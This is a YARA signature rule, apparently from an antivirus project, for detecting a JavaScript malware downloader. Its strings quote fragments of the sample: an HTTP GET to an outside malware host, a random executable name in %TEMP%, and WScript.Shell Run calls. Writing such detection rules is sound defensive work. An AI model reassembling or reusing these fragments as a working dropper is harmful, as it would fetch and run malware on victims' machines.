rule sig_20160329_f4774cff2d0c1a4c61defd1f5c26c764 {
  meta:
    description = "datamaliciousorder - file 20160329_f4774cff2d0c1a4c61defd1f5c26c764.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "799582e8725af3c14b076047d35d33bbc6e43e7d782977a4e18e57466e4935cf"

  strings:
    $x1  = "function Tcbwfw() {return Ajkplpb[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"jmlUBBCM3197Irc.exe\";};" fullword ascii
    $s2  = "Aipxtm[Cmdmxxhv](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "do {WScript[Potqytmmc](Fojpqiaqj() * 11)} while (Aipxtm[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Txpfwddev(Tfraz, Nzscizmv){return Tfraz - Nzscizmv;};" fullword ascii
    $s5  = "var Ajkplpb = function Izoky() {return WScript[Ivzibr](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Soumsdinib(Kuymhnay){Ajkplpb[\"Run\"](Kuymhnay, Sjgtxgssv, Sjgtxgssv);};" fullword ascii
    $s7  = "function Vcdyd() {return ((Wsjwkufcn == true) && (Wsjwkufcn == Gyrbrx)) ? 1 : Sjgtxgssv;};" fullword ascii
    $s8  = "return Txpfwddev(Oesephf, Jaxtrr);" fullword ascii
    $s9  = "var Wsjwkufcn = false;" fullword ascii
    $s10 = "var Gyrbrx = false;" fullword ascii
    $s11 = "function Fojpqiaqj(){return 22;};" fullword ascii
    $s12 = "function Nhssmvyonw(){return Kfhtl;};" fullword ascii
    $s13 = "function Ptkkqghzou(){return Ivzibr;};" fullword ascii
    $s14 = "Gyrbrx = true; " fullword ascii
    $s15 = "Wsjwkufcn = true; " fullword ascii
    $s16 = "function Vcsowwtniw(Hsuhjnsw) {var Zqajcwgflo = (1, 2, 3, 4, 5, Hsuhjnsw); return Zqajcwgflo;};" fullword ascii
    $s17 = "var Klvsascgk = new this[\"Date\"]();" fullword ascii
    $s18 = "var Pniwmpees = false;" fullword ascii
    $s19 = " while (Qzbfkojg){" fullword ascii
    $s20 = "function Ccuhxeqqdo()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    1 of ($x*) and 4 of them
}